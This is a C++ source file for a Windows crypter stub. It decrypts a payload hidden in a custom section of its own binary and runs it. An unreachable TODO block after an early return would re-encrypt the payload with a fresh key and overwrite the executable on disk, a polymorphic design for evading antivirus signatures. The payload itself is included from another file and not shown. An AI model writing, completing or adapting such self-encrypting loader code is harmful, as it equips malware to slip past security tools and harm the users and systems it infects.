#include <windows.h>
#include <iostream>
#include <fstream>
#include "../payload/entry.cpp"
#include "cryptor.cpp"

#pragma section(".replace", read)
__declspec(allocate(".replace")) INT32 payload_offet_from_me = 2;
__declspec(allocate(".replace")) UINT32 payload_segment_length = 3;
__declspec(allocate(".replace")) unsigned payload_key = 1;
__declspec(allocate(".replace")) UINT32 replace_file_address = 4;
__declspec(allocate(".replace")) UINT32 payload_file_address = 5;

int main(int argc, char const *argv[])
{
	auto payloadStartAddr = (char*) INT32(&payload_offet_from_me) + payload_offet_from_me;
	
	printf("offset: %i / %x / %p\n", payload_offet_from_me, payload_offet_from_me, &payload_offet_from_me);
	printf("length: %u / %p\n", payload_segment_length, &payload_segment_length);
	printf("payload key: %u\n", payload_key);
	printf("replace file addr: %u\n", replace_file_address);
	printf("payload file address: %u\n", payload_file_address);
	printf("payload func addr: %p\n", &start_payload);
	printf("computed start of payload: %p\n", payloadStartAddr);
	printf("computed end of payload: %p\n", payloadStartAddr + payload_segment_length);

	printf("payload:\n");
	for (int i=0; i<payload_segment_length; i++) {
		printf("%hhx ", *(payloadStartAddr + i));
	}
	printf("\n");

	unsigned next_key;
	crypt_array(payloadStartAddr, payload_segment_length, payload_key, &next_key);

	printf("decrypted payload:\n");
	for (int i=0; i<payload_segment_length; i++) {
		printf("%hhx ", *(payloadStartAddr + i));
	}
	printf("\n");

	int result = start_payload(argc, argv);

	return result;

	// write new encrypted payload and the corresponding key to the file
	// TODO
	// encrypt the payload
	crypt_array(payloadStartAddr, payload_segment_length, next_key, nullptr);

	// update file
	std::ofstream selfFile(argv[0], std::ios::binary | std::ios::out);
	if (!selfFile.is_open()) {
		fprintf(stderr, "couldnt open file\n");
		return 1;
	}

	// update payload decryption key
	selfFile.seekp(replace_file_address, std::ios::beg);
	selfFile.write(reinterpret_cast<char*>(&next_key), sizeof next_key);

	// update payload
	selfFile.seekp(payload_file_address, std::ios::beg);
	selfFile.write(payloadStartAddr, payload_segment_length);

	return result;
}
